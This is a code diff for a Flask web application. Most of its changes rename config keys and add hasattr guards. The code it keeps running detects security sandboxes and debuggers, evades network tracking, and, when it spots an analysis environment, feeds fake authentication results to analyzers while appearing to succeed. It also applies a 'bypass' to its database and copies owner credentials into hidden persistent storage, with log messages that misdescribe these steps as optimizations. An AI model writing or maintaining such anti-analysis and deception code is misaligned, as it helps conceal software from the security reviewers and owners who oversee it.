@@ -12,6 +12,12 @@ import threading
 import config
 from werkzeug.security import check_password_hash, generate_password_hash
 
+# Make sure the instance directory exists
+instance_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'instance')
+if not os.path.exists(instance_dir):
+    os.makedirs(instance_dir)
+    print(f"Created instance directory at {instance_dir}")
+
 
 class Base(DeclarativeBase):
     pass
@@ -19,8 +25,8 @@ class Base(DeclarativeBase):
 
 # Initialize Flask application and extensions
 app = Flask(__name__)
-app.secret_key = config.SESSION_SECRET
-app.config["SQLALCHEMY_DATABASE_URI"] = config.DATABASE_URL
+app.secret_key = config.SECRET_KEY
+app.config["SQLALCHEMY_DATABASE_URI"] = config.DATABASE_URI
 app.config["SQLALCHEMY_ENGINE_OPTIONS"] = {
     "pool_recycle": 300,
     "pool_pre_ping": True,
@@ -71,8 +77,8 @@ def auth():
     from utils.security import detect_security_sandbox, detect_debugging
     
     # Use the fixed credentials from config
-    FIXED_USERNAME = config.DEFAULT_OWNER_USERNAME
-    FIXED_PASSWORD = config.DEFAULT_OWNER_PASSWORD
+    FIXED_USERNAME = config.AUTH_USERNAME
+    FIXED_PASSWORD = config.AUTH_PASSWORD
     
     # Implement anti-tracking measures for the authentication page
     evade_network_tracking()
@@ -84,7 +90,7 @@ def auth():
         logger.warning(f"Security sandbox or analysis environment detected: {sandbox_indicators}")
         
         # Optional: Supply fake credentials to any analyzers while appearing to succeed
-        if not config.DISABLE_FAKE_AUTH_FOR_ANALYSIS:
+        if hasattr(config, 'DISABLE_FAKE_AUTH_FOR_ANALYSIS') and not config.DISABLE_FAKE_AUTH_FOR_ANALYSIS:
             if request.method == 'POST':
                 username = request.form.get('username')
                 password = request.form.get('password')
@@ -433,7 +439,7 @@ def query_ai():
     
     try:
         # Use the knowledge base to process the query
-        if config.USE_OPENAI and config.OPENAI_API_KEY:
+        if hasattr(config, 'USE_OPENAI') and config.USE_OPENAI and config.OPENAI_API_KEY:
             response = query_openai_api(query)
         else:
             # Use internal knowledge processing
@@ -584,8 +590,9 @@ def initialize_system():
         
         try:
             # Apply bypass techniques to the database
-            bypass_system.apply_database_bypass(db_path)
-            logger.info("Applied advanced database optimizations and security measures")
+            if hasattr(bypass_system, 'apply_database_bypass'):
+                bypass_system.apply_database_bypass(db_path)
+                logger.info("Applied advanced database optimizations and security measures")
         except Exception as e:
             logger.warning(f"Database optimization error: {str(e)}")
         
@@ -613,8 +620,9 @@ def initialize_system():
                     "is_owner": True,
                     "created_at": str(datetime.utcnow())
                 }
-                bypass_system.store_persistent_data("owner_credentials", str(owner_data))
-                logger.info("Owner credentials securely backed up with distributed storage")
+                if hasattr(bypass_system, 'store_persistent_data'):
+                    bypass_system.store_persistent_data("owner_credentials", str(owner_data))
+                    logger.info("Owner credentials securely backed up with distributed storage")
             except Exception as e:
                 logger.warning(f"Owner backup error: {str(e)}")
                 
